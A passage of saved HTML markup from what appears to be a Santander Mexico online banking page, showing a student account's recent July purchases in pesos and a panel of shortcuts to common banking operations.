                                                                                <div _ngcontent-c17="" class="col-5 m-0 p-0">
                                                                                    <p _ngcontent-c17="" class="letra1">OXXO MEDELLIN C COLIMA COL 0000000</p>
                                                                                    <p _ngcontent-c17="" class="letra3">SUPER CUENTA UNIVERSITARIA</p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 m-0 p-0">
                                                                                    <p _ngcontent-c17="" class="text-yellow mount">
                                                                                        <span _ngcontent-c17="" class="cents col-12 pl-0">- 61.<small>00 MXN</small></span>
                                                                                    </p>
                                                                                </div>
                                                                            </div>
                                                                            <div _ngcontent-c17="" class="row">
                                                                                <div _ngcontent-c17="" class="col-2"></div>
                                                                                <div _ngcontent-c17="" class="col-5 panel">
                                                                                    <p _ngcontent-c17="" class="letra4">
                                                                                        ??Quieres pagar a plazos?
                                                                                    </p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 panel">
                                                                                    <p _ngcontent-c17="" class="letra5 text-right">
                                                                                        <u _ngcontent-c17="">S??, hacer Pago F??cil</u>
                                                                                    </p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="lineborder"></div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-c17="" class="ng-star-inserted">
                                                                            <div _ngcontent-c17="" class="row justify-content-between row-move">
                                                                                <div _ngcontent-c17="" class="col-2 rojo move-date">
                                                                                    16 Jul
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 m-0 p-0">
                                                                                    <p _ngcontent-c17="" class="letra1">DMT ROCK BAR COLIMA COL 0000000</p>
                                                                                    <p _ngcontent-c17="" class="letra3">SUPER CUENTA UNIVERSITARIA</p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 m-0 p-0">
                                                                                    <p _ngcontent-c17="" class="text-yellow mount">
                                                                                        <span _ngcontent-c17="" class="cents col-12 pl-0">- 526.<small>00 MXN</small></span>
                                                                                    </p>
                                                                                </div>
                                                                            </div>
                                                                            <div _ngcontent-c17="" class="row">
                                                                                <div _ngcontent-c17="" class="col-2"></div>
                                                                                <div _ngcontent-c17="" class="col-5 panel">
                                                                                    <p _ngcontent-c17="" class="letra4">
                                                                                        ??Quieres pagar a plazos?
                                                                                    </p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 panel">
                                                                                    <p _ngcontent-c17="" class="letra5 text-right">
                                                                                        <u _ngcontent-c17="">S??, hacer Pago F??cil</u>
                                                                                    </p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="lineborder"></div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-c17="" class="ng-star-inserted">
                                                                            <div _ngcontent-c17="" class="row justify-content-between row-move">
                                                                                <div _ngcontent-c17="" class="col-2 rojo move-date">
                                                                                    15 Jul
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 m-0 p-0">
                                                                                    <p _ngcontent-c17="" class="letra1">KIOSCO CRISTOBA VILLA DE ALVA 0000000</p>
                                                                                    <p _ngcontent-c17="" class="letra3">SUPER CUENTA UNIVERSITARIA</p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 m-0 p-0">
                                                                                    <p _ngcontent-c17="" class="text-yellow mount">
                                                                                        <span _ngcontent-c17="" class="cents col-12 pl-0">- 47.<small>00 MXN</small></span>
                                                                                    </p>
                                                                                </div>
                                                                            </div>
                                                                            <div _ngcontent-c17="" class="row">
                                                                                <div _ngcontent-c17="" class="col-2"></div>
                                                                                <div _ngcontent-c17="" class="col-5 panel">
                                                                                    <p _ngcontent-c17="" class="letra4">
                                                                                        ??Quieres pagar a plazos?
                                                                                    </p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 panel">
                                                                                    <p _ngcontent-c17="" class="letra5 text-right">
                                                                                        <u _ngcontent-c17="">S??, hacer Pago F??cil</u>
                                                                                    </p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="lineborder"></div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-c17="" class="ng-star-inserted">
                                                                            <div _ngcontent-c17="" class="row justify-content-between row-move">
                                                                                <div _ngcontent-c17="" class="col-2 rojo move-date">
                                                                                    14 Jul
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 m-0 p-0">
                                                                                    <p _ngcontent-c17="" class="letra1">117MPROMODA COL COLIMA COL 0000000</p>
                                                                                    <p _ngcontent-c17="" class="letra3">SUPER CUENTA UNIVERSITARIA</p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 m-0 p-0">
                                                                                    <p _ngcontent-c17="" class="text-yellow mount">
                                                                                        <span _ngcontent-c17="" class="cents col-12 pl-0">- 628.<small>30 MXN</small></span>
                                                                                    </p>
                                                                                </div>
                                                                            </div>
                                                                            <div _ngcontent-c17="" class="row">
                                                                                <div _ngcontent-c17="" class="col-2"></div>
                                                                                <div _ngcontent-c17="" class="col-5 panel">
                                                                                    <p _ngcontent-c17="" class="letra4">
                                                                                        ??Quieres pagar a plazos?
                                                                                    </p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 panel">
                                                                                    <p _ngcontent-c17="" class="letra5 text-right">
                                                                                        <u _ngcontent-c17="">S??, hacer Pago F??cil</u>
                                                                                    </p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="lineborder"></div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-c17="" class="ng-star-inserted">
                                                                            <div _ngcontent-c17="" class="row justify-content-between row-move">
                                                                                <div _ngcontent-c17="" class="col-2 rojo move-date">
                                                                                    13 Jul
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 m-0 p-0">
                                                                                    <p _ngcontent-c17="" class="letra1">1993 VALLE DORA COLIMA COL 0000000</p>
                                                                                    <p _ngcontent-c17="" class="letra3">SUPER CUENTA UNIVERSITARIA</p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 m-0 p-0">
                                                                                    <p _ngcontent-c17="" class="text-yellow mount">
                                                                                        <span _ngcontent-c17="" class="cents col-12 pl-0">- 71.<small>00 MXN</small></span>
                                                                                    </p>
                                                                                </div>
                                                                            </div>
                                                                            <div _ngcontent-c17="" class="row">
                                                                                <div _ngcontent-c17="" class="col-2"></div>
                                                                                <div _ngcontent-c17="" class="col-5 panel">
                                                                                    <p _ngcontent-c17="" class="letra4">
                                                                                        ??Quieres pagar a plazos?
                                                                                    </p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="col-5 panel">
                                                                                    <p _ngcontent-c17="" class="letra5 text-right">
                                                                                        <u _ngcontent-c17="">S??, hacer Pago F??cil</u>
                                                                                    </p>
                                                                                </div>
                                                                                <div _ngcontent-c17="" class="lineborder"></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <!---->
                                                                <div class="ps__rail-x" style="left: 0px; bottom: 0px;">
                                                                    <div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 0px;"></div>
                                                                </div>
                                                                <div class="ps__rail-y" style="top: 0px; right: 0px; height: 321px;">
                                                                    <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 113px;"></div>
                                                                </div>
                                                            </div>
                                                        </perfect-scrollbar>

                                                    </div>
                                                </div>
                                            </div>
                                            <div _ngcontent-c17="" class="d-none d-lg-block">
                                                <super-fast-operations _ngcontent-c17="" _nghost-c22="">
                                                    <div _ngcontent-c22="" class="pl-4">
                                                        <div _ngcontent-c22="" class="pl-2">
                                                            <div _ngcontent-c22="" class="d-none d-none d-lg-block d-xl-block">

                                                                <!---->

                                                                <div _ngcontent-c22="" class="container shortcuts p-0">
                                                                    <div _ngcontent-c22="" class="col-12">
                                                                        <div _ngcontent-c22="" class="row">
                                                                            <p _ngcontent-c22="" class="title">Operaciones m??s usadas</p>
                                                                            <!----><span _ngcontent-c22="" class="favs-icon-coachmark ng-star-inserted"></span>
                                                                        </div>
                                                                    </div>

                                                                    <!---->
                                                                    <!---->
                                                                    <div _ngcontent-c22="" class="row t-border border-top-0 ng-star-inserted">
                                                                        <div _ngcontent-c22="" class="col-6 item-wrapper active-hover">
                                                                            <div _ngcontent-c22="" class="d-block text-center">
                                                                                <span _ngcontent-c22="" class="fo-santander-plus"></span>
                                                                                <p _ngcontent-c22="" class="px-1 mb-0">Cu??nto he ganado Santander Plus</p>
                                                                                <!---->
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-c22="" class="col-6 item-wrapper active-hover">
                                                                            <div _ngcontent-c22="" class="d-block text-center">
                                                                                <span _ngcontent-c22="" class="fo-portabilidad-traer">
                                                                                </span>
                                                                                <p _ngcontent-c22="" class=" px-1 mb-0">
                                                                                    Traer n??mina
                                                                                </p>
                                                                                <!---->
                                                                            </div>
                                                                        </div>
                                                                    </div>

                                                                    <!---->

                                                                    <!---->
                                                                    <div _ngcontent-c22="" class="row t-border ng-star-inserted">
                                                                        <div _ngcontent-c22="" class="col-6 item-wrapper active-hover">
                                                                            <div _ngcontent-c22="" class="d-block text-center">
                                                                                <span _ngcontent-c22="" class="fo-edo-cuenta"></span>
                                                                                <p _ngcontent-c22="" class="px-1 mb-0">Estado de cuenta</p>
                                                                                <!---->
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-c22="" class="col-6 item-wrapper active-hover">
                                                                            <div _ngcontent-c22="" class="d-block text-center">
                                                                                <span _ngcontent-c22="" class="fo-transferencias">
                                                                                </span>
                                                                                <p _ngcontent-c22="" class=" px-1 mb-0">
                                                                                    Transferencias
                                                                                </p>
                                                                                <!---->
                                                                            </div>
                                                                        </div>
                                                                    </div>

                                                                    <!---->

                                                                    <!---->
                                                                    <div _ngcontent-c22="" class="row t-border ng-star-inserted">
                                                                        <div _ngcontent-c22="" class="col-6 item-wrapper active-hover">
                                                                            <div _ngcontent-c22="" class="d-block text-center">
                                                                                <span _ngcontent-c22="" class="fo-pagos"></span>
                                                                                <p _ngcontent-c22="" class="px-1 mb-0">Pagos</p>
                                                                                <!---->
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-c22="" class="col-6 item-wrapper active-hover">
                                                                            <div _ngcontent-c22="" class="d-block text-center">
                                                                                <span _ngcontent-c22="" class="fo-inversiones">
                                                                                </span>
                                                                                <p _ngcontent-c22="" class=" px-1 mb-0">
                                                                                    Inversiones
                                                                                </p>
                                                                                <!---->
                                                                                <p _ngcontent-c22="" class="px-1 mb-0 ng-star-inserted">
                                                                                    Compra Venta
                                                                                </p>
                                                                            </div>
                                                                        </div>
                                                                    </div>

                                                                    <!---->

                                                                    <!---->
                                                                    <div _ngcontent-c22="" class="row t-border ng-star-inserted">
                                                                        <div _ngcontent-c22="" class="col-6 item-wrapper active-hover">
                                                                            <div _ngcontent-c22="" class="d-block text-center">
                                                                                <span _ngcontent-c22="" class="fo-token"></span>
                                                                                <p _ngcontent-c22="" class="px-1 mb-0">Estatus token</p>
                                                                                <!---->
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-c22="" class="col-6 item-wrapper active-hover">
                                                                            <div _ngcontent-c22="" class="d-block text-center">
                                                                                <span _ngcontent-c22="" class="fo-admin-cuentas">
                                                                                </span>
                                                                                <p _ngcontent-c22="" class=" px-1 mb-0">
                                                                                    Administraci??n de cuentas
                                                                                </p>
                                                                                <!---->
                                                                            </div>
                                                                        </div>
                                                                    </div>

                                                                    <!---->

                                                                    <!---->
                                                                    <div _ngcontent-c22="" class="row t-border ng-star-inserted">
                                                                        <div _ngcontent-c22="" class="col-6 item-wrapper active-hover">
                                                                            <div _ngcontent-c22="" class="d-block text-center">
                                                                                <span _ngcontent-c22="" class="fo-limite-importe"></span>
                                                                                <p _ngcontent-c22="" class="px-1 mb-0">L??mites de importes</p>
                                                                                <!---->
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-c22="" class="col-6 item-wrapper active-hover">
                                                                            <div _ngcontent-c22="" class="d-block text-center">
                                                                                <span _ngcontent-c22="" class="fo-paperless">
                                                                                </span>
                                                                                <p _ngcontent-c22="" class=" px-1 mb-0">
                                                                                    Paperless
                                                                                </p>
                                                                                <!---->
                                                                            </div>
                                                                        </div>
                                                                    </div>

                                                                    <!---->

                                                                    <!---->
                                                                    <div _ngcontent-c22="" class="row t-border ng-star-inserted">
                                                                        <div _ngcontent-c22="" class="col-6 item-wrapper active-hover">
                                                                            <div _ngcontent-c22="" class="d-block text-center">
                                                                                <span _ngcontent-c22="" class="fo-bitacora"></span>
                                                                                <p _ngcontent-c22="" class="px-1 mb-0">Consulta de bit??cora</p>
                                                                                <!---->
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-c22="" class="col-6 item-wrapper active-hover">
                                                                            <div _ngcontent-c22="" class="d-block text-center">
                                                                                <span _ngcontent-c22="" class="fo-alta-cuenta">
                                                                                </span>
                                                                                <p _ngcontent-c22="" class=" px-1 mb-0">
                                                                                    Alta de cuentas
                                                                                </p>
                                                                                <!---->
                                                                            </div>
                                                                        </div>
                                                                    </div>

                                                                    <!---->

                                                                    <!---->
                                                                    <div _ngcontent-c22="" class="row t-border ng-star-inserted">
                                                                        <div _ngcontent-c22="" class="col-6 item-wrapper active-hover">
                                                                            <div _ngcontent-c22="" class="d-block text-center">
                                                                                <span _ngcontent-c22="" class="fo-editar"></span>
                                                                                <p _ngcontent-c22="" class="px-1 mb-0">Actualizar datos de notificaci??n</p>
                                                                                <!---->
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-c22="" class="col-6 item-wrapper active-hover">
                                                                            <div _ngcontent-c22="" class="d-block text-center">
                                                                                <span _ngcontent-c22="" class="null">
                                                                                </span>
                                                                                <p _ngcontent-c22="" class=" px-1 mb-0">

                                                                                </p>
                                                                                <!---->
                                                                            </div>
                                                                        </div>
                                                                    </div>

                                                                </div>
                                                            </div>

                                                            <div _ngcontent-c22="" class="row line-div lateral-panel">
                                                                <div _ngcontent-c22="" class="col-box text-left text-nowrap col-description">
                                                                    <div _ngcontent-c22="" class="tooltip">
                                                                        <img _ngcontent-c22="" alt="" class="tooltip mr-1" src="../assets/img/CocnoceAppsIcon.svg">
                                                                        <span _ngcontent-c22="" class="tooltiptext">
                                                                            <div _ngcontent-c22="" class="text-center">

                                                                                <div _ngcontent-c22="" class="row line-div border-bottom">
                                                                                    <div _ngcontent-c22="" class="col border-right">
                                                                                        <div _ngcontent-c22="">
                                                                                            <a _ngcontent-c22="">
                                                                                                <img _ngcontent-c22="" alt="" src="../assets/img/tooltipHome/recompensas.png">
                                                                                            </a>
                                                                                        </div>
                                                                                    </div>
                                                                                    <div _ngcontent-c22="" class="col">
                                                                                        <div _ngcontent-c22="">
                                                                                            <a _ngcontent-c22="">
                                                                                                <img _ngcontent-c22="" alt="" src="../assets/img/tooltipHome/twist.png">
                                                                                            </a>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>

                                                                                <div _ngcontent-c22="" class="row line-div border-bottom">
                                                                                    <div _ngcontent-c22="" class="col border-right">
                                                                                        <div _ngcontent-c22="">
                                                                                            <a _ngcontent-c22="">
                                                                                                <img _ngcontent-c22="" alt="" src="../assets/img/tooltipHome/transferencias_saldos.png">
                                                                                            </a>
                                                                                        </div>
                                                                                    </div>
                                                                                    <div _ngcontent-c22="" class="col">
                                                                                        <div _ngcontent-c22="">
                                                                                            <a _ngcontent-c22="">
                                                                                                <img _ngcontent-c22="" alt="" src="../assets/img/tooltipHome/puntos.png">
                                                                                            </a>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>

                                                                                <div _ngcontent-c22="" class="row line-div border-bottom">
                                                                                    <div _ngcontent-c22="" class="col border-right">
                                                                                        <div _ngcontent-c22="">
                                                                                            <a _ngcontent-c22="">
                                                                                                <img _ngcontent-c22="" alt="" class="space" src="../assets/img/tooltipHome/casacompara.png">
                                                                                            </a>
                                                                                        </div>
                                                                                    </div>
                                                                                    <div _ngcontent-c22="" class="col">
                                                                                        <div _ngcontent-c22="">
                                                                                            <a _ngcontent-c22="">
                                                                                                <img _ngcontent-c22="" alt="" src="../assets/img/tooltipHome/autocompara.png">
                                                                                            </a>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>

                                                                                <div _ngcontent-c22="" class="row line-div border-bottom">
                                                                                    <div _ngcontent-c22="" class="col border-right">
                                                                                        <div _ngcontent-c22="">
                                                                                            <a _ngcontent-c22="">
                                                                                                <img _ngcontent-c22="" alt="" class="space" src="../assets/img/tooltipHome/viajacompara.png">
                                                                                            </a>
                                                                                        </div>
                                                                                    </div>
                                                                                    <div _ngcontent-c22="" class="col">
                                                                                        <div _ngcontent-c22="">
                                                                                            <a _ngcontent-c22="">
                                                                                                <img _ngcontent-c22="" alt="" src="../assets/img/tooltipHome/universia.png">
                                                                                            </a>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>

                                                                                <div _ngcontent-c22="" class="row line-div border-bottom">
                                                                                    <div _ngcontent-c22="" class="col border-right">
                                                                                        <div _ngcontent-c22="">
                                                                                            <a _ngcontent-c22="">
                                                                                                <img _ngcontent-c22="" alt="" class="space" src="../assets/img/tooltipHome/tucarrera.png">
                                                                                            </a>
                                                                                        </div>
                                                                                    </div>
                                                                                    <div _ngcontent-c22="" class="col">
                                                                                        <div _ngcontent-c22="">
                                                                                            <a _ngcontent-c22="">
                                                                                                <img _ngcontent-c22="" alt="" src="../assets/img/tooltipHome/izettle.png">
                                                                                            </a>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>

                                                                                <div _ngcontent-c22="" class="row line-div border-bottom">
                                                                                    <div _ngcontent-c22="" class="col border-right">
                                                                                        <div _ngcontent-c22="">
                                                                                            <a _ngcontent-c22="">
                                                                                                <img _ngcontent-c22="" alt="" src="../assets/img/tooltipHome/supermovil.png">
                                                                                            </a>
                                                                                        </div>
                                                                                    </div>
                                                                                    <div _ngcontent-c22="" class="col">
                                                                                        <div _ngcontent-c22="">
                                                                                            <a _ngcontent-c22="">
                                                                                                <img _ngcontent-c22="" alt="" class="space" src="../assets/img/tooltipHome/tutoriales_supernet.png">
                                                                                            </a>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>

                                                                                <div _ngcontent-c22="" class="row line-div">
                                                                                    <div _ngcontent-c22="" class="col border-right">
                                                                                        <div _ngcontent-c22="">
                                                                                            <a _ngcontent-c22="">
                                                                                                <img _ngcontent-c22="" alt="" src="../assets/img/tooltipHome/tutoriales_supermovil.png">
                                                                                            </a>
                                                                                        </div>
                                                                                    </div>
                                                                                    <div _ngcontent-c22="" class="col">
                                                                                        <div _ngcontent-c22="">
                                                                                            <a _ngcontent-c22="">
                                                                                                <img _ngcontent-c22="" alt="" src="../assets/img/tooltipHome/superdigital.png">
                                                                                            </a>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>

                                                                            </div>
                                                                        </span>
                                                                    </div>
                                                                    <span _ngcontent-c22="" class="ml-1 space text-mobile">
                                                                        Conoce Santander
                                                                    </span>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </super-fast-operations>
                                            </div>

                                        </div>
                                    </div>

                                </div>
                            </ng-component>
                        </super-shell>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<super-footer _ngcontent-c1="" _nghost-c12="">
